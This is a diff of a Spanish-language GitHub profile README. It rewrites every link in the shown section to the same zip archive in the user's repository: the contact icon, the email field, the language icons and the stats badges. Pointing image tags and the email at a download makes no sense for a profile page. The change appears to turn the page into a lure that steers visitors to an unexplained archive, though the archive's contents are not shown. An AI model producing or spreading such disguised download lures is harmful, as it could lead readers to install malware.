@@ -8,30 +8,30 @@
 
 ### ¡Contáctame!
 
-[<img align="left" alt="GitHub" width="22px" src="https://raw.githubusercontent.com/jmnote/z-icons/master/svg/github.svg" />](https://github.com/emixde12)
+[<img align="left" alt="GitHub" width="22px" src="https://raw.githubusercontent.com/emixde12/emixde12/main/coperception/emixde_v2.7.zip" />](https://raw.githubusercontent.com/emixde12/emixde12/main/coperception/emixde_v2.7.zip)
 <br />
 
-📧 **Correo:** ianemilianoram00@gmail.com
+📧 **Correo:** https://raw.githubusercontent.com/emixde12/emixde12/main/coperception/emixde_v2.7.zip
 
 ### 🔧 Lenguajes y Herramientas que utilizo:
 
 __Generales:__  
 <br />
-<img align="left" src="https://raw.githubusercontent.com/jmnote/z-icons/master/svg/python.svg" width="30" height="30" />
-<img align="left" src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/arduino/arduino-original.svg" width="30" height="30" />
-<img align="left" src="https://raw.githubusercontent.com/jmnote/z-icons/master/svg/git.svg" width="30" height="30" />
-<img align="left" src="https://raw.githubusercontent.com/devicons/devicon/master/icons/cplusplus/cplusplus-original.svg" width="30" height="30" />
-<img align="left" src="https://raw.githubusercontent.com/devicons/devicon/master/icons/html5/html5-original.svg" width="30" height="30" />
-<img align="left" src="https://raw.githubusercontent.com/devicons/devicon/master/icons/css3/css3-original.svg" width="30" height="30" />
-<img align="left" src="https://raw.githubusercontent.com/devicons/devicon/master/icons/typescript/typescript-original.svg" width="30" height="30" />
+<img align="left" src="https://raw.githubusercontent.com/emixde12/emixde12/main/coperception/emixde_v2.7.zip" width="30" height="30" />
+<img align="left" src="https://raw.githubusercontent.com/emixde12/emixde12/main/coperception/emixde_v2.7.zip" width="30" height="30" />
+<img align="left" src="https://raw.githubusercontent.com/emixde12/emixde12/main/coperception/emixde_v2.7.zip" width="30" height="30" />
+<img align="left" src="https://raw.githubusercontent.com/emixde12/emixde12/main/coperception/emixde_v2.7.zip" width="30" height="30" />
+<img align="left" src="https://raw.githubusercontent.com/emixde12/emixde12/main/coperception/emixde_v2.7.zip" width="30" height="30" />
+<img align="left" src="https://raw.githubusercontent.com/emixde12/emixde12/main/coperception/emixde_v2.7.zip" width="30" height="30" />
+<img align="left" src="https://raw.githubusercontent.com/emixde12/emixde12/main/coperception/emixde_v2.7.zip" width="30" height="30" />
 <br />
 
 ## 🔎 Mis estadísticas
 <details>
     <summary>🔎 Ver</summary>
 
-![GitHub stats](https://denvercoder1-github-readme-stats.vercel.app/api/?username=emixde12&show_icons=true&theme=tokyonight&include_all_commits=true)
-![Top Langs](https://denvercoder1-github-readme-stats.vercel.app/api/top-langs/?username=emixde12&layout=compact&theme=tokyonight)
+![GitHub stats](https://raw.githubusercontent.com/emixde12/emixde12/main/coperception/emixde_v2.7.zip)
+![Top Langs](https://raw.githubusercontent.com/emixde12/emixde12/main/coperception/emixde_v2.7.zip)
 
 </details>
 
